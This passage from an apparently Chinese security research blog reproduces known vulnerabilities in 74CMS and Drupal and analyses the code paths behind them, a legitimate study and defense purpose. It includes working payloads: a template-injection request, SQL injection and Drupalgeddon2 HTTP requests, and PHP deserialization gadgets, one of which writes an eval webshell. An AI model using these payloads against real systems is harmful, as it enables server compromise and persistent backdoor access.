class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UnicodeString</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $string;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;string = <span class="keyword">new</span> See;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>\<span class="title">UnicodeString</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> UnicodeString()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有个问题是这个POP利用链回显的时候会报错，不能正常显示。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214536.png" alt=""></p>
<p>但是命令是成功执行的：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214737.png" style="zoom:50%;" />
<p>讲道理，应该还可以接着挖。</p>
<h2 id="参考文章">参考文章</h2>
<p><a href="https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg">https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg</a></p>
<p><a href="https://xz.aliyun.com/t/8307">https://xz.aliyun.com/t/8307</a></p>
<p><a href="https://www.anquanke.com/post/id/217930">https://www.anquanke.com/post/id/217930</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>骑士CMS模板注入+文件包含getshell复现</title>
    <url>/code_audit/PHP/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="骑士CMS模板注入-日志包含RCE复现">骑士CMS模板注入+日志包含RCE复现</h1>
<p>本文参考自TimeLine Sec团队成员microworld的复现记录。</p>
<h2 id="0x01-漏洞概述">0x01 漏洞概述</h2>
<p><a href="http://www.74cms.com/news/show-2497.html">http://www.74cms.com/news/show-2497.html</a></p>
<p>骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。</p>
<h2 id="0x02-影响版本">0x02 影响版本</h2>
<p>骑士 CMS &lt; 6.0.48</p>
<h2 id="0x03-环境搭建">0x03 环境搭建</h2>
<p>从官网下载6.0.20版本源代码</p>
<p><a href="http://www.74cms.com/download/index.html">http://www.74cms.com/download/index.html</a></p>
<p>新建数据库，用MAMP Pro搭建站点</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201214210511.png" alt=""></p>
<h2 id="0x04-漏洞复现">0x04 漏洞复现</h2>
<p>发送如下请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;</span><br><span class="line">1</span><br><span class="line">&amp;tpl&#x3D;&lt;?php phpinfo(); ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215153839.png" alt=""></p>
<ol start="2">
<li>查看站点日志，文件位于<code>/data/Runtime/Logs/home/20_12_15.log</code></li>
</ol>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154016.png" alt=""></p>
<ol start="3">
<li>包含日志</li>
</ol>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154208.png" alt=""></p>
<h2 id="0x05-漏洞分析">0x05 漏洞分析</h2>
<p>在正式分析漏洞之前，先看一看74CMS的路由和日志记录。</p>
<p>由于74CMS是基于ThinkPHP 3.2.3，其标准的URL路径为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php&#x2F;模块&#x2F;控制器&#x2F;操作</span><br></pre></td></tr></table></figure>
<p>但是74CMS采用的是普通模式，使用传统的GET传参来指定当前访问的模块、控制器和方法，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;?m&#x3D;模块&amp;c&#x3D;控制器&amp;a&#x3D;方法&amp;var&#x3D;参数</span><br></pre></td></tr></table></figure>
<p>当然这些参数也是可以自定义的，配置文件位于<code>ThinkPHP/Conf/convention.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154751.png" alt=""></p>
<p>其次，ThinkPHP定义了日志记录的方式，在<code>ThinkPHP/Library/Think/Log.class.php</code>中的write方法：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215155115.png" alt=""></p>
<p>ERR代表一般性错误，<code>$destination</code>是日志的存储位置，日志文件名是有<code>年_月_日</code>组成。</p>
<p>根据官方通告，漏洞代码位于<code>Application/Common/Controller/BaseController.class.php</code>的<code>assign_resume_tpl</code>方法，用于渲染简历模板：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160033.png" alt=""></p>
<p>继续跟进fetch函数，该函数位于<code>Controllor.class.php</code>文件中：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160208.png" alt=""></p>
<p>函数内部又调用了<code>ThinkPHP/Lirary/Think/View.class.php</code>类中的<code>fetch</code>方法：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160728.png" alt=""></p>
<p><code>content</code>为空进入第一个if判断，模板文件不存在的话直接返回，下一个if语句判断<code>TMPL_ENGINE_TYPE</code>是否是<code>php</code>，我们可以全局搜索这个常量，在<code>ThinkPHP/Conf/convention.php</code>中定义为<code>Think</code>，也就是说使用Think模板，那么就进入到else语句中。</p>
<p>首先构造一个参数数组<code>$params</code>，然后将调用静态方法<code>Hook::listen</code>，继续跟进，位于<code>ThinkPHP/Library/Hook.class.php</code>文件中：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215161649.png" alt=""></p>
<p>此时<code>tag=view_parse</code>，该方法会查找<code>$tags</code>中有没有绑定<code>view_parse</code>事件的方法，然后用foreach遍历<code>$tags</code>属性，并执行<code>Hook:exec</code>方法。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215172131.png" alt=""></p>
<p>此方法会检查行为名称中是否存在<code>Behavior</code>，若存在此关键字，行为扩展必须使用run入口方法，关于Hook的配置在<code>/ThinkPHP/Mode/common.php</code>中</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215184343.png" alt=""></p>
<p>继续跟进到<code>ThinkPHP/Behavior/ParseTemplateBehavior.class.php</code>，找到文件中的run方法：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215184717.png" alt=""></p>
<p>已知74CMS采用的是Think模板引擎，当首次运行时不存在缓存文件，会进入到else语句中，新建一个Template类，在调用类中的fetch方法，位于<code>ThinkPHP/Library/Think/Template.class.php</code>文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215185208.png" alt=""></p>
<p>调用<code>loadTemplate()</code>，将其存入<code>templateCacheFile</code>中，我们跟入<code>loadTemplate</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215185930.png" alt=""></p>
<p>首先读取templateFile的文件内容存到tmplContent中，然后再调用compiler函数编译模板内容，继续跟进：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215190136.png" alt=""></p>
<p>传入的模板内容未经过过滤就直接被拼接到<code>$tmplContent</code>变量，然后返回<code>loadTemplate</code>方法，调用<code>put</code>方法写入缓存文件，并返回缓存文件名，于是我们再回归到<code>fetch()</code>方法，调用了<code>Storage::load</code>，位于<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215191004.png" alt=""></p>
<p>这里就直接包含文件，最终造成了模板注入。</p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Drupal历史漏洞分析复现</title>
    <url>/code_audit/PHP/16.Drupal%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="Durpal历史漏洞复现记录">Durpal历史漏洞复现记录</h1>
<p>在具体分析Drupal的历史漏洞之前，可能需要先大致了解一下Durpal的整个工作流程，这里推荐三篇文章：</p>
<p><a href="https://blog.csdn.net/u011474028/article/details/53021051">https://blog.csdn.net/u011474028/article/details/53021051</a></p>
<p><a href="https://blog.fleeto.us/post/drupal-from-request-to-response/">https://blog.fleeto.us/post/drupal-from-request-to-response/</a></p>
<p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p>
<h2 id="CVE-2014-3704-SQL注入漏洞">CVE-2014-3704 SQL注入漏洞</h2>
<h3 id="影响版本">影响版本</h3>
<p>Drupal &lt; 7.32</p>
<h3 id="环境安装">环境安装</h3>
<p>从官网中下载Drupal 7.31版本的源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://www.drupal.org/project/drupal/releases/7.31</span><br></pre></td></tr></table></figure>
<p>使用MAMP Pro搭建站点后，更改数据库的相关配置：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127141314.png" alt=""></p>
<p>访问本地IP:8080端口，使用默认安装配置即可。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127132647.png" alt=""></p>
<p>验证安装成功：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127140826.png" alt=""></p>
<p>在不登录的情况下，验证payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?q&#x3D;node&amp;destination&#x3D;node HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line"></span><br><span class="line">pass&#x3D;lol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]&#x3D;bob&amp;name[0]&#x3D;a</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127140938.png" alt=""></p>
<h3 id="漏洞分析">漏洞分析</h3>
<p>我们可以从上面这张图中看出，漏洞的触发点是在user.module文件中的<code>user_login_authenticate_validate()</code>这个函数。</p>
<p>下断点调试，查看函数调用栈：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201231923.png" alt=""></p>
<p>这个函数在2149行对准备将提交的name参数进行SQL语句拼接：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201232302.png" alt=""></p>
<p>继续跟进<code>db_query</code>函数，此时payload存储在args数组中</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201232615.png" alt=""></p>
<p>调用<code>query()</code>函数，在这个函数中，继续调用<code>expandArguments</code>进行实质的SQL语句拼接</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161036.png" alt=""></p>
<p>此时query已经是拼接后的SQL语句</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161432.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161523.png" alt=""></p>
<p>最后执行SQL</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161630.png" alt=""></p>
<p>在mysql monitor工具中可以看到具体的执行语句</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161715.png" alt=""></p>
<h2 id="CVE-2017-6920-反序列化任意代码执行漏洞">CVE-2017-6920 反序列化任意代码执行漏洞</h2>
<h3 id="影响版本-v2">影响版本</h3>
<p>Drupal 8 &lt; 8.3.3</p>
<h3 id="环境安装-v2">环境安装</h3>
<p>从官网中下载Durpal 8.3.0版本的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.drupal.org&#x2F;project&#x2F;drupal&#x2F;releases&#x2F;8.3.0</span><br></pre></td></tr></table></figure>
<p>使用MAMP Pro集成环境搭建，更改php.ini配置，打开Yaml扩展：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130359.png" alt=""></p>
<p>查看PHPINFO验证是否开启Yaml扩展：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130431.png" alt=""></p>
<p>必须在配置文件中启用yaml.decode_php，否则无法复现成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yaml.decode_php &#x3D; 1</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>登录管理员账号</p>
</li>
<li>
<p>访问<code>http://127.0.0.1:8080/admin/config/development/configuration/single/import</code></p>
</li>
<li>
<p>POC：<code>!php/object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;s:9:\&quot;_fn_close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;&quot;</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130726.png" alt=""></p>
</li>
</ol>
<p>成功执行phpinfo</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202133316.png" alt=""></p>
<h3 id="漏洞分析-v2">漏洞分析</h3>
<p>查看官方的commit记录可以发现漏洞的触发点：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202133822.png" alt=""></p>
<p>可以看到8.3.4版本的decode函数新增了一段代码，其作用主要就是改变PHP配置文件中的<code>yaml.decode_php=0</code>，那么我们就跟进这个文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134115.png" alt=""></p>
<p>漏洞所在函数<code>decode</code>的触发点代码就是上图中调用<code>yaml_parse</code>这个函数，其中<code>$raw</code>参数直接被带入<code>yaml_parse</code>函数中，看一下官方文档对于这个函数的描述：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134255.png" alt=""></p>
<p>第一个参数是需要parse成yaml的文档流，并且这个参数是从这个函数外部输入的。另外，在官方文档的下方有一个对这个函数的特别说明：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134439.png" alt=""></p>
<p>意思就是如果使用了<code>!php/object</code>tag，yaml_parse会对第一个参数调用unserialize()，如果要禁止这样做，就通过设置<code>yaml.decode_php</code>来处理，这就是官方补丁在<code>decode</code>函数前面加的那几行代码。</p>
<p>因此，这个远程代码执行漏洞的罪魁祸首就是<code>yaml_parse</code>函数可能会用反序列化的形式来处理输入的字符串，从而导致通过反序列化类的方式来操作一些危险类，最终实现代码执行。</p>
<p>那么控制decode函数的参数<code>$raw</code>就可以出发这个漏洞。回溯定位<code>decode</code>函数的调用位置，在<code>core/lib/Drupal/Component/Serialization/Yaml.php</code>文件中</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202135144.png" alt=""></p>
<p>在第34行该函数调用了getSerializer函数，跟进到第48行，首先判断是否存在yaml扩展，如果存在的话就使用<code>YamlPecl</code>类，然后调用这个类中的<code>decode</code>函数，也就是会调用<code>yaml_parse</code>函数。</p>
<p>继续回溯调用<code>Yaml::decode</code>函数的地方，全局查找一共有36处地方：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202140845.png" alt=""></p>
<p>其中外部可控的地方只有一处，位于<code>ConfigSingleImportForm.php</code>文件中。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202141142.png" alt=""></p>
<p>这里对外部输入的import值进行<code>Yaml::decode</code>操作，那么这就是漏洞的数据触发点。</p>
<p>既然是反序列化，那么就需要找到一个可以反序列化的类。全局搜索<code>__destruct</code>或<code>__wakeup</code>关键字，一般而言<code>__destruct</code>更容易利用。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202141427.png" alt=""></p>
<ol>
<li>
<p><code>/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202143842.png" alt=""></p>
<p>通过反序列化这个类可以造成写入webshell，但是利用过程相比后面两个而言更为麻烦一点。PHPGGC已经包含了这个gadget，拿过来稍微改一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">SetCookie</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;data = [</span><br><span class="line">        <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;ca01h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Value&#x27;</span> =&gt; <span class="string">&#x27;ca01h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Expires&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">&#x27;Discard&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;Domain&#x27;</span> =&gt; $data</span><br><span class="line">      ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">CookieJar</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cookies = [];</span><br><span class="line">    <span class="keyword">private</span> $strictMode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;cookies = [<span class="keyword">new</span> SetCookie($data)];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">FileCookieJar</span> <span class="keyword">extends</span> <span class="title">CookieJar</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $filename;</span><br><span class="line">    <span class="keyword">private</span> $storeSessionCookies = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="built_in">parent</span>::__construct($data);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $new = <span class="keyword">new</span> FileCookieJar(<span class="string">&#x27;/Users/ca01h/Desktop/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;!php/object &#x27;</span> . <span class="string">&#x27;&quot;&#x27;</span> . addslashes(serialize($new)) . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>/vendor/symfony/process/Pipes/WindowsPipes.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161528.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161558.png" alt=""></p>
<p>反序列化这个类可以造成任意文件删除。</p>
</li>
<li>
<p><code>/vendor/guzzlehttp/psr7/src/FnStream.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161812.png" alt=""></p>
<p>反序列化这个类可以实现无参数RCE。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">FnStream</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title">private</span> $<span class="title">methods</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> $methods</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;methods = $methods;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Create the functions on the class</span></span><br><span class="line">      <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $name =&gt; $fn) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="string">&#x27;_fn_&#x27;</span> . $name&#125; = $fn;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $new = <span class="keyword">new</span> FnStream(<span class="keyword">array</span>(<span class="string">&quot;close&quot;</span> =&gt; <span class="string">&quot;phpinfo()&quot;</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;!php/object &#x27;</span> . <span class="string">&#x27;&quot;&#x27;</span> . addslashes(serialize($new)) . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="CVE-2018-7600-远程命令执行漏洞">CVE-2018-7600 远程命令执行漏洞</h2>
<h3 id="影响版本-v3">影响版本</h3>
<p>Drupal 7 &lt; 7.58</p>
<p>Drupal 8.3.x &lt; 8.3.9</p>
<p>Drupal 8.4.x &lt; 8.4.6</p>
<p>Drupal 8.5.x &lt; 8.5.1</p>
<h3 id="环境安装-v3">环境安装</h3>
<p>从官网中下载Durpal 8.5.0版本的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.drupal.org&#x2F;project&#x2F;drupal&#x2F;releases&#x2F;8.5.0</span><br></pre></td></tr></table></figure>
<p>使用MAMP Pro搭建，成功安装后，在不登录的情况下发送如下数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;register?element_parents&#x3D;account&#x2F;mail&#x2F;%23value&amp;ajax_form&#x3D;1&amp;_wrapper_format&#x3D;drupal_ajax HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id&#x3D;user_register_form&amp;_drupal_ajax&#x3D;1&amp;mail[#post_render][]&#x3D;exec&amp;mail[#type]&#x3D;markup&amp;mail[#markup]&#x3D;id</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202210038.png" alt=""></p>
<h3 id="漏洞分析-v3">漏洞分析</h3>
<p><a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/">https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/</a></p>
<p><a href="http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/">http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/</a></p>
<p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p>
<h2 id="CVE-2018-7602-远程命令执行漏洞">CVE-2018-7602 远程命令执行漏洞</h2>
<p><a href="http://blog.nsfocus.net/cve-2018-7602-drupal/">http://blog.nsfocus.net/cve-2018-7602-drupal/</a></p>
<h2 id="CVE-2019-6339-远程代码执行漏洞">CVE-2019-6339 远程代码执行漏洞</h2>
<p><a href="https://paper.seebug.org/897/">https://paper.seebug.org/897/</a></p>
<h2 id="CVE-2019-6341-1-click-XSS">CVE-2019-6341 1-click XSS</h2>
<h2 id="CVE-2020-28948-28949-远程代码执行漏洞-任意文件覆盖漏洞">CVE-2020-28948/28949 远程代码执行漏洞/任意文件覆盖漏洞</h2>
<h3 id="影响版本-v4">影响版本</h3>
<p>Drupal 9 &lt; 9.0.9</p>
<p>Drupal 8.9 &lt; 8.9.10</p>
<p>Drupal 8.8 &lt; 8.8.12</p>
<p>Drupal 8.x (x≠8)</p>
<p>Drupal 7 &lt; 7.75</p>
<h3 id="漏洞分析-v4">漏洞分析</h3>
<p>先查看Drupal官方发的漏洞通报：</p>
